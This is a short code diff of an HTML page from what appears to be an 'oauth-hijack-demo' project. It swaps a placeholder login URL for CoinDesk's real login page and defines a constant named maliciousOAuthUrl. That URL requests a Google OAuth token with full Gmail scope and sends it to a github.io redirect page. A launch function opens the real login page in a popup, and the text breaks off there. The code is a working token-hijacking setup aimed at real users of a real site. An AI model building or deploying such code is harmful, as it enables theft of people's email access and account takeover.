@@ -9,7 +9,7 @@
 
   <script>
     // ****** Replace with your login url ************
-    const loginTarget = "https://replace_me.com/login" 
+    const loginTarget = "https://www.coindesk.com/auth/login?returnTo=https%3A%2F%2Fwww.coindesk.com%2F&reg_module=navigation&_gl=1*10amvwo*_up*MQ..*_ga*MTc5NDkwMDY1Mi4xNzQ2MDIwODk2*_ga_VM3STRYVN8*MTc0NjAyMDg5Ni4xLjAuMTc0NjAyMDg5Ni4wLjAuMTA5NjUxMjg0" 
     const maliciousOAuthUrl = "https://accounts.google.com/o/oauth2/v2/auth?client_id=870583892774-o38qbckfb9vom8s7np3vqcb74cecjc3m.apps.googleusercontent.com&redirect_uri=https://zonia-bad.github.io/oauth-hijack-demo/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
     function launch() {
       const win = window.open(loginTarget, "_blank", "width=900,height=700");
